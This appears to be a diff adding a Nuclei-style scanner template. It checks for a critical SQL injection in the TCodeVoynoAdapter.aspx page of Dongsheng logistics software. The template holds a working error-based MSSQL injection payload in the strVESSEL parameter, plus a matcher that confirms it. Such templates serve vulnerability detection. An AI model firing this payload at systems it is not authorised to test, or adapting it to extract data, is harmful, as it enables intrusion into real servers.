@@ -1,0 +1,23 @@
+id: dongsheng-TCodeVoynoAdapter-sqli
+
+
+info:
+  name: dongsheng-TCodeVoynoAdapter-sqli
+  author: fitz
+  severity: critical
+  tags: SQL Injection
+  description: 东胜物流软件TCodeVoynoAdapter存在SQL注入漏洞
+
+http:
+  - raw:
+    - |
+      GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1'%20AND%202523%20IN%20(SELECT%20(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT%20SUBSTRING((ISNULL(CAST((%20sys.fn_VarBinToHexStr(hashbytes('MD5','hello')))%20AS%20NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))%20AND%20'uKco'%3d'uKco HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
+      Accept-Encoding: gzip, deflate
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==500 && contains_all(body,"qxpqq0x5d41402abc4b2a76b9719d911017c592qzkqq")
